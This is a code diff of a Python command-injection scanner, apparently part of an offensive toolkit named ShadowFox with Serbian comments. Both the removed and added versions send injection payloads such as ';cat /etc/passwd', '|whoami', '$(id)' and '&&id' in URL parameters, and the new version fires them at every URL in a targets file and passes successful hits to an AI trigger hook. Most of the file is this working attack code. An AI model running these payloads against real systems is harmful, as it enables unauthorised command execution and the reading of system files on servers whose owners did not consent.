@@ -1,31 +1,49 @@
-import sys, os
-sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
 import requests
-from core.log_to_text import log_to_text, classify_severity
-RCE_PAYLOADS = [
-    "test;id", "test|id", "$(id)", "`id`", "%24(id)", "test&&id"
-]
+import sys
+import os
+sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
 
-def test_rce(url):
-    try:
-        for payload in RCE_PAYLOADS:
-            full_url = f"{url}?input={payload}"
-            print(f"[+] Testiram RCE na: {full_url}")
-            response = requests.get(full_url, timeout=5)
-            if "uid=" in response.text or "gid=" in response.text:
-                print(f"[!] Mogući RCE: {full_url}")
-                severity = classify_severity(f"RCE: {full_url}")
-                log_to_text(__file__, f"RCE: {full_url}" + f' | Severity: {{severity}}')
-    except Exception as e:
-        print(f"[-] Greška: {e}")
+from log_to_text import log_to_text
+from tools.auto_add_severity import classify_severity
+from logics.fuzz_ai_trigger import ai_trigger_if_needed
 
-def run_rce():
-    print("[~] Pokrećem RCE test...")
-    targets = [
-        "http://testphp.vulnweb.com",  # zameni sa svojim metama
+def scan_rce(url):
+    payloads = [
+        ";cat /etc/passwd",
+        "|whoami",
+        "&&id",
+        "|echo RCE_FOUND",
+        ";echo vulnerable"
     ]
-    for t in targets:
-        test_rce(t)
+
+    headers = {
+        "User-Agent": "ShadowFox-RCE-Scanner"
+    }
+
+    for payload in payloads:
+        if "FUZZ" in url:
+            test_url = url.replace("FUZZ", payload)
+        else:
+            test_url = f"{url}?cmd={payload}"
+
+        try:
+            res = requests.get(test_url, headers=headers, timeout=8)
+            if "root:x:" in res.text or "uid=" in res.text or "RCE_FOUND" in res.text:
+                log_to_text(f"[RCE] {test_url} -> {payload}")
+                severity = classify_severity(res.text)
+                ai_trigger_if_needed("RCE", test_url, payload, res.text, severity)
+                print(f"[+] RCE DETEKTOVAN: {test_url}")
+                return {"url": test_url, "payload": payload, "severity": severity}
+        
+        except Exception as e:
+            print(f"[-] Greška kod {test_url}: {e}")
+
+    print("[-] Nema RCE ranjivosti detektovanih.")
+    return None
 
 if __name__ == "__main__":
-    run_rce()
+    with open("targets/targets.txt", "r") as f:
+        urls = f.read().splitlines()
+
+    for url in urls:
+        scan_rce(url)
